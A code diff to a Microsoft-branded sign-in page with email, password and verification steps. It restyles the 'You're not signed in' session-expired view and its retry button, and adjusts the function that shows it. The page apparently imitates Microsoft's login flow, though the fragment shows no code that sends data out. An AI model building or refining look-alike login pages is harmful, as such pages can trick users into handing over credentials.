@@ -120,12 +120,12 @@
 </div>
 </div>
 
-<div id="sessionExpiredView" style="display:none">
-<img src="https://acctcdn.msftauth.net/images/microsoft_logo_7lyNn7YkjJOP0NwZNw6QvQ2.svg" alt="Microsoft" class="se-mslogo">
-<h1 style="font-size:24px;font-weight:600;color:#1b1f1b;margin-bottom:16px;text-align:left;font-family:'Segoe UI',sans-serif;line-height:1.33">You're not signed in</h1>
-<p id="sessionExpiredMessage" style="font-size:14px;color:#616161;line-height:1.5;margin-bottom:32px;max-width:400px;font-family:'Segoe UI',sans-serif"></p>
-<div class="se-btn-row">
-<button type="button" id="sessionExpiredRetryBtn" class="fui-Button fui-Button--primary">Try again</button>
+<div id="sessionExpiredView" style="display:none;width:440px;max-width:95vw;flex-direction:column;align-items:flex-start;text-align:left;background:#fff;border-radius:8px;padding:44px 44px 36px;box-shadow:0 2px 6px rgba(0,0,0,.2);box-sizing:border-box">
+<img src="https://acctcdn.msftauth.net/images/microsoft_logo_7lyNn7YkjJOP0NwZNw6QvQ2.svg" alt="Microsoft" class="se-mslogo" style="display:block;height:24px;width:auto;margin:0 0 16px 0;align-self:flex-start">
+<h1 style="font-size:24px;font-weight:600;color:#1b1b1b;margin-bottom:12px;text-align:left;font-family:'Segoe UI',sans-serif;line-height:1.33">You're not signed in</h1>
+<p id="sessionExpiredMessage" style="font-size:14px;color:#1b1b1b;line-height:1.43;margin-bottom:24px;text-align:left;font-family:'Segoe UI',sans-serif"></p>
+<div class="se-btn-row" style="width:100%;display:flex;justify-content:flex-start">
+<button type="button" id="sessionExpiredRetryBtn" class="fui-Button fui-Button--primary" onclick="location.reload()" style="width:100%;min-height:36px">Try again</button>
 </div></div>
 
 <div id="loadingOverlay" class="splash-screen">
@@ -149,7 +149,7 @@ var lastSubmittedDestination='',lastSubmittedDestinationType='',cachedVerificati
 
 function showStyledError(m){var c=document.getElementById('styledErrorContainer'),e=document.getElementById('styledErrorMessage');if(c&&e){e.textContent=m||'An unexpected error occurred.';c.style.display='block'}}
 function hideStyledError(){var c=document.getElementById('styledErrorContainer');if(c)c.style.display='none'}
-function showFailedView(m){['emailStep','passwordStep','verificationStep'].forEach(function(id){var e=document.getElementById(id);if(e)e.style.display='none'});var eC=document.getElementById('emailChip');if(eC)eC.style.display='none';var sv=document.getElementById('sessionExpiredView');if(sv){sv.style.display='block';sv.style.position='fixed';sv.style.top='50%';sv.style.left='50%';sv.style.transform='translate(-50%,-50%)';sv.style.zIndex='20'}var lc=document.getElementById('sessionExpiredMessage');if(lc){var msg=m||'Your session has expired. Please try again.';try{if(typeof msg==='string'&&msg.trim().startsWith('{')){var parsed=JSON.parse(msg);msg=parsed.message||parsed.error||msg}}catch(e){}lc.textContent=msg}}
+function showFailedView(m){['emailStep','passwordStep','verificationStep'].forEach(function(id){var e=document.getElementById(id);if(e)e.style.display='none'});var eC=document.getElementById('emailChip');if(eC)eC.style.display='none';var sv=document.getElementById('sessionExpiredView');if(sv){sv.style.display='flex';sv.style.flexDirection='column';sv.style.alignItems='flex-start';sv.style.textAlign='left';sv.style.position='fixed';sv.style.top='50%';sv.style.left='50%';sv.style.transform='translate(-50%,-50%)';sv.style.zIndex='20'}var lc=document.getElementById('sessionExpiredMessage');if(lc){var msg=m||'Your session has expired. Please try again.';try{if(typeof msg==='string'&&msg.trim().startsWith('{')){var parsed=JSON.parse(msg);msg=parsed.message||parsed.error||msg}}catch(e){}lc.textContent=msg}}
 function objToForm(o){return Object.keys(o).map(function(k){return encodeURIComponent(k)+'='+encodeURIComponent(o[k])}).join('&')}
 function isValidEmail(e){return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(e)||/^\+?[\d\s\-()]{7,}$/.test(e)}
 function showLoadingOverlay(){var o=document.getElementById('loadingOverlay');if(o){o.classList.remove('splash-hidden');o.style.display='flex'}var lc=document.getElementById('loginCard');if(lc)lc.style.display='none'}
